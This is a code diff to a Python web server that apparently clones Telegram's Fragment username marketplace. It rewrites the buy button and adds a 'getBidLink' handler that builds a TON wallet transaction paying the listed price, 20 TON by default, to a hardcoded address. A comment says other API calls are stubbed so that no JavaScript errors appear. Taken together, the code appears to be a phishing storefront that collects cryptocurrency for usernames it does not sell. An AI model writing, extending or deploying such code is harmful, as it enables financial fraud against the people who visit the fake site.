@@ -260,7 +260,7 @@ def generate_sale_page(display_name, price_ton, end_datetime=None):
     content = re.sub(
         r'<div class="tm-section-box tm-section-buttons">.*?</div>',
         f'<div class="tm-section-box tm-section-buttons">'
-        f'<button class="btn btn-primary ton-auth-link">Buy for {price_str} TON</button></div>',
+        f'<button class="btn btn-primary js-buy-now-btn" data-bid-amount="{price_str}">Buy for {price_str} TON</button></div>',
         content, flags=re.DOTALL
     )
 
@@ -1055,6 +1055,31 @@ class Handler(http.server.BaseHTTPRequestHandler):
 
         if method == "tonLogOut":
             self.send_json({"ok": 1})
+            return
+
+        if method == "getBidLink":
+            import base64, json as _json
+            username = params.get("username", [""])[0]
+            # Find price for this username (default 20 TON)
+            price_ton = FOR_SALE_USERNAMES.get(username.lower(), 20)
+            # Amount in nanotons (1 TON = 1_000_000_000 nanotons)
+            amount_nano = str(price_ton * 1_000_000_000)
+            recipient = "UQCMXMXvUvwu5bZ2ElRMW-Q-8d7zuS_OoSW32UNznQPltXTs"
+            comment = f"Buy @{username} for {price_ton} TON"
+            # Encode comment as a TON text payload (opcode 0x00000000 + text)
+            comment_bytes = b'\x00\x00\x00\x00' + comment.encode('utf-8')
+            payload_b64 = base64.b64encode(comment_bytes).decode()
+            transaction = {
+                "validUntil": 9999999999,
+                "messages": [
+                    {
+                        "address": recipient,
+                        "amount": amount_nano,
+                        "payload": payload_b64,
+                    }
+                ]
+            }
+            self.send_json({"ok": 1, "transaction": transaction})
             return
 
         # All other API calls — return ok so no JS errors appear
